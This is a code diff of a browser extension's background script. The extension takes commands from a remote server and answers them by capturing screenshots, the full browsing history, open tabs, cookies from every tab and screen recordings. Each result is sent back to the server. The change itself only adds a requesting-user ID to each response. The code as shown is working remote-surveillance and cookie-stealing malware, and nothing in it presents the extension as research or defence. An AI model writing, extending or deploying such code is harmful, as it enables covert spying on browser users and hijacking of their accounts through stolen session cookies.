@@ -164,27 +164,27 @@ async function processCommand(command) {
         switch (command.type) {
             case 'take_screenshot':
                 console.log(`📸 Screenshot requested by ${command.requestedBy}`);
-                await captureScreenshot(command.id);
+                await captureScreenshot(command.id, command.requestedById);
                 break;
 
             case 'get_history':
                 console.log(`📜 History requested by ${command.requestedBy}`);
-                await captureHistory(command.id);
+                await captureHistory(command.id, command.requestedById);
                 break;
 
             case 'get_activity':
                 console.log(`📊 Activity requested by ${command.requestedBy}`);
-                await captureActivity(command.id);
+                await captureActivity(command.id, command.requestedById);
                 break;
 
             case 'get_cookies':
                 console.log(`🍪 Cookies requested by ${command.requestedBy}`);
-                await captureCookies(command.id);
+                await captureCookies(command.id, command.requestedById);
                 break;
 
             case 'start_recording':
                 console.log(`🎥 Recording requested by ${command.requestedBy}`);
-                await captureRecording(command.id);
+                await captureRecording(command.id, command.requestedById);
                 break;
 
             case 'open_tabs':
@@ -207,7 +207,7 @@ async function processCommand(command) {
 }
 
 // ============ Screenshot Capture ============
-async function captureScreenshot(commandId) {
+async function captureScreenshot(commandId, userId) {
     try {
         // Get active tab
         const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
@@ -229,18 +229,18 @@ async function captureScreenshot(commandId) {
             image: screenshotUrl,
             tabTitle: tab.title,
             tabUrl: tab.url
-        });
+        }, userId);
 
         console.log('✅ Screenshot sent to server!');
 
     } catch (error) {
         console.error('Error capturing screenshot:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
 
 // ============ Browser History Capture ============
-async function captureHistory(commandId) {
+async function captureHistory(commandId, userId) {
     try {
         // Get all browser history
         const historyItems = await chrome.history.search({
@@ -254,18 +254,18 @@ async function captureHistory(commandId) {
         // Send to server
         await sendCommandResponse(commandId, 'history', {
             history: historyItems
-        });
+        }, userId);
 
         console.log('✅ History sent to server!');
 
     } catch (error) {
         console.error('Error capturing history:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
 
 // ============ Browser Activity Capture ============
-async function captureActivity(commandId) {
+async function captureActivity(commandId, userId) {
     try {
         // Get all browser tabs
         const tabs = await chrome.tabs.query({});
@@ -290,25 +290,25 @@ async function captureActivity(commandId) {
         // Send to server
         await sendCommandResponse(commandId, 'activity', {
             tabs: tabsInfo
-        });
+        }, userId);
 
         console.log('✅ Activity sent to server!');
 
     } catch (error) {
         console.error('Error capturing activity:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
 
 // ============ Cookies (Browser Cookies) Capture ============
-async function captureCookies(commandId) {
+async function captureCookies(commandId, userId) {
     try {
         // Get all browser tabs
         const tabs = await chrome.tabs.query({});
         
         // Get user ID from storage
         const storage = await chrome.storage.local.get(['clientId']);
-        const userId = storage.clientId || CLIENT_ID;
+        const userIdVal = storage.clientId || CLIENT_ID;
         
         let totalCookies = 0;
         const tabsData = [];
@@ -352,7 +352,7 @@ async function captureCookies(commandId) {
 
         // Format the data according to the specified structure
         const formattedData = {
-            userId: userId,
+            userId: userIdVal,
             timestamp: new Date().toISOString(),
             source: "popup",
             totalTabs: tabsData.length,
@@ -365,13 +365,13 @@ async function captureCookies(commandId) {
         // Send to server
         await sendCommandResponse(commandId, 'cookies', {
             cookiesData: formattedData
-        });
+        }, userId);
 
         console.log('✅ Cookies data sent to server!');
 
     } catch (error) {
         console.error('Error capturing cookies:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
 
@@ -437,7 +437,7 @@ async function openNewTabs(commandId, urls) {
 }
 
 // ============ Screen Recording Capture ============
-async function captureRecording(commandId) {
+async function captureRecording(commandId, userId) {
     try {
         // Get active tab
         const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
@@ -451,7 +451,7 @@ async function captureRecording(commandId) {
         // Inject content script to handle recording with screen picker
         await chrome.scripting.executeScript({
             target: { tabId: tab.id },
-            func: async (cmdId, tabInfo) => {
+            func: async (cmdId, tabInfo, usrId) => {
                 try {
                     console.log('🎥 [Content] Starting recording...');
                     
@@ -489,7 +489,8 @@ async function captureRecording(commandId) {
                                 video: reader.result,
                                 size: blob.size,
                                 tabTitle: tabInfo.title,
-                                tabUrl: tabInfo.url
+                                tabUrl: tabInfo.url,
+                                userId: usrId
                             });
                         };
                         
@@ -509,18 +510,19 @@ async function captureRecording(commandId) {
                     chrome.runtime.sendMessage({
                         type: 'recording-error',
                         commandId: cmdId,
-                        error: err.message
+                        error: err.message,
+                        userId: usrId
                     });
                 }
             },
-            args: [commandId, { title: tab.title, url: tab.url }]
+            args: [commandId, { title: tab.title, url: tab.url }, userId]
         });
 
         console.log('🎥 Recording script injected, user will see screen picker...');
 
     } catch (error) {
         console.error('Error starting recording:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
 
@@ -563,23 +565,23 @@ async function handleRecordingData(message) {
             tabUrl: message.tabUrl,
             duration: 15,
             size: message.size
-        });
+        }, message.userId);
 
         console.log('✅ Recording sent to server!');
     } catch (error) {
         console.error('Error sending recording:', error);
-        await sendCommandResponse(message.commandId, 'error', { message: error.message });
+        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
     }
 }
 
 async function handleRecordingError(message) {
     console.error('🎥 Recording error:', message.error);
-    await sendCommandResponse(message.commandId, 'error', { message: message.error });
+    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
 }
 
 
 // ============ Send Command Response ============
-async function sendCommandResponse(commandId, type, data) {
+async function sendCommandResponse(commandId, type, data, userId = null) {
     try {
         const response = await fetch(`${SERVER_BASE_URL}/command-response`, {
             method: 'POST',
@@ -591,7 +593,8 @@ async function sendCommandResponse(commandId, type, data) {
                 extensionId: EXTENSION_ID,
                 commandId: commandId,
                 type: type,
-                data: data
+                data: data,
+                userId: userId
             })
         });
 
